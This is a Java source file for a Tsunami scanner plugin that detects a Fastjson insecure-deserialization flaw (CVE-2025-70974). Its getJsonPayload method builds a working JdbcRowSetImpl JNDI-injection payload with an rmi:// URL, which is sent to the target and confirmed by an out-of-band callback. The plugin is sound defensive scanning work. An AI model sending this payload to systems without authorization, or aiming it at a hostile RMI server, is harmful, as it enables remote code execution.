/*
 * Copyright 2025 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.google.tsunami.plugins.detectors.cves.cve202570974;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.base.Verify.verify;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.gson.JsonObject;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.NotImplementedException;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

/** A Tsunami plugin that detects CVE-2025-70974 in Alibaba's Fastjson. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Alibaba Fastjson Insecure Deserialization RCE (CVE-2025-70974)",
    version = "0.1",
    description =
        "Due to insecure deserialization in Alibaba's Fastjson, there is a JNDI injection allowing"
            + " loading remote classes and ultimately Remote Code Execution.",
    author = "Robert Dick (robert@doyensec.com)",
    bootstrapModule = AlibabaFastjsonCve202570974BootstrapModule.class)
public final class AlibabaFastjsonCve202570974 implements VulnDetector {
  @VisibleForTesting static final String VULNERABILITY_REPORT_PUBLISHER = "TSUNAMI_COMMUNITY";
  @VisibleForTesting static final String VULNERABILITY_REPORT_ID = "CVE-2025-70974";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_TITLE =
      "Alibaba Fastjson Insecure Deserialization RCE (CVE-2025-70974)";

  private static final String PAYLOAD_TEMPLATE = "rmi://HOST/obj";

  static final String VULNERABILITY_REPORT_DESCRIPTION_BASIC =
      "The scanner detected a vulnerable instance of Fastjson parsing the body of a request"
          + " (CVE-2025-70974). The vulnerability can be exploited by sending an unauthenticated"
          + " HTTP POST request containing a URL that points to a malicious Java RMI server. "
          + " This can easily lead to Remote Code Execution.";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_DESCRIPTION_CALLBACK =
      VULNERABILITY_REPORT_DESCRIPTION_BASIC
          + "The vulnerability was confirmed via an out of band callback.";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_RECOMMENDATION =
      "Update Fastjson to the latest version.";

  // This endpoint is not set, so the POST request goes to the web root in the current
  // implementation.
  // Fastjson is not a web service by itself, and it can parse JSON anywhere.
  @VisibleForTesting static final String EXPLOIT_ENDPOINT = "";

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private final Clock utcClock;
  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;
  private String core;

  @Inject
  AlibabaFastjsonCve202570974(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
    this.payloadGenerator = checkNotNull(payloadGenerator);
    this.core = "";
  }

  @Override
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher(VULNERABILITY_REPORT_PUBLISHER)
                    .setValue(VULNERABILITY_REPORT_ID))
            .addRelatedId(
                VulnerabilityId.newBuilder().setPublisher("CVE").setValue("CVE-2025-70974"))
            .setSeverity(Severity.CRITICAL)
            .setTitle(VULNERABILITY_REPORT_TITLE)
            .setDescription(VULNERABILITY_REPORT_DESCRIPTION_CALLBACK)
            .setRecommendation(VULNERABILITY_REPORT_RECOMMENDATION)
            .build());
  }

  // Since Fastjson is a simple JSON parser, we test by sending a POST request to / with the JSON
  // body. There is no easy way to fingerprint Fastjson since errors might be handled differently
  // depending on the web server.
  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log(
        "Alibaba Fastjson Insecure Deserialization RCE (CVE-2025-70974) starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private String getJsonPayload(String payload) {
    // Build the JSON object containing the malicious RMI instance
    JsonObject a = new JsonObject();
    a.addProperty("@type", "java.lang.Class");
    a.addProperty("val", "com.sun.rowset.JdbcRowSetImpl");

    JsonObject b = new JsonObject();
    b.addProperty("@type", "com.sun.rowset.JdbcRowSetImpl");
    b.addProperty("dataSourceName", payload);
    b.addProperty("autoCommit", true);

    JsonObject jsonPayload = new JsonObject();
    jsonPayload.add("a", a);
    jsonPayload.add("b", b);

    return jsonPayload.toString();
  }

  // Checks whether a given instance is vulnerable.
  private boolean isServiceVulnerable(NetworkService networkService) {

    // Generate the payload for the callback server
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.SSRF)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.INTERPRETATION_ANY)
            .setExecutionEnvironment(PayloadGeneratorConfig.ExecutionEnvironment.EXEC_ANY)
            .build();

    String oobCallbackUrl = "";
    Payload payload = null;

    // Check if the callback server is available, fallback to response matching if not
    try {
      payload = this.payloadGenerator.generate(config);
      // Use callback for RCE confirmation and raise severity on success
      if (payload == null || !payload.getPayloadAttributes().getUsesCallbackServer()) {
        logger.atWarning().log("Tsunami Callback Server not available");
        return false;
      } else {
        oobCallbackUrl = payload.getPayload();
      }
    } catch (NotImplementedException e) {
      return false;
    }

    String rmiPayload = PAYLOAD_TEMPLATE.replace("HOST", oobCallbackUrl);
    String jsonPayload = getJsonPayload(rmiPayload);

    // Send the malicious HTTP request
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + EXPLOIT_ENDPOINT;
    logger.atInfo().log("Sending payload to '%s'", targetUri);
    HttpRequest req =
        HttpRequest.post(targetUri)
            .setHeaders(HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
            .setRequestBody(ByteString.copyFromUtf8(jsonPayload))
            .build();

    try {
      this.httpClient.send(req, networkService);
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send payload to '%s'", targetUri);
    }
    // payload should never be null here as we should have already returned in that case
    verify(payload != null);
    if (payload.checkIfExecuted()) {
      logger.atInfo().log("Vulnerability confirmed via Callback Server.");
      return true;
    } else {
      logger.atInfo().log(
          "Callback not received and response does not match vulnerable instance, instance is not"
              + " vulnerable.");
      return false;
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {

    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(this.getAdvisories().get(0))
        .build();
  }
}
